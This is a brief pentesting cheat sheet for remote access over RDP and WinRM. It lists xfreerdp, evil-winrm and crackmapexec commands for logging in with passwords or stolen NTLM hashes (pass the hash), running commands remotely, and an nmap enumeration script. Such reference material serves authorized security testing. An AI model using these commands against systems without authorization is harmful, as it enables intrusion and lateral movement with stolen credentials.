# RDP (3389/tcp) & WinRM (5985/tcp)

## RDP

```bash
xfreerdp /v:TARGET /u:user /p:'password' /cert-ignore
xfreerdp /v:TARGET /u:admin /pth:NTLM_HASH /cert-ignore     # pass the hash
nmap --script rdp-ntlm-info -p 3389 TARGET                   # hostname + domain
```

## WinRM

```bash
evil-winrm -i TARGET -u user -p 'password'
evil-winrm -i TARGET -u user -H NTLM_HASH                   # pass the hash
crackmapexec winrm TARGET -u user -p pass -x "whoami"
```
